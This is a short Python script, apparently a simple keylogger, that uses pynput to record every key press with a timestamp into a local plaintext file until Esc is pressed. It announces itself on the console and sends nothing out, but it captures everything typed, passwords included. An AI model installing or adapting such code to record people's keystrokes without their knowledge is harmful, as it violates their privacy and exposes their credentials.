from pynput import keyboard
import datetime, os

os.makedirs("input_logs", exist_ok=True)
LOG_FILE = "input_logs/keys_log.txt"

def write_log(message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {message}\n")
    print(message)

def on_press(key):
    try:
        write_log(f"Key pressed: {key.char}")
    except AttributeError:
        write_log(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        write_log("Capture stopped")
        return False

write_log("Capture started")
print("Input capture active")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Stopped.")

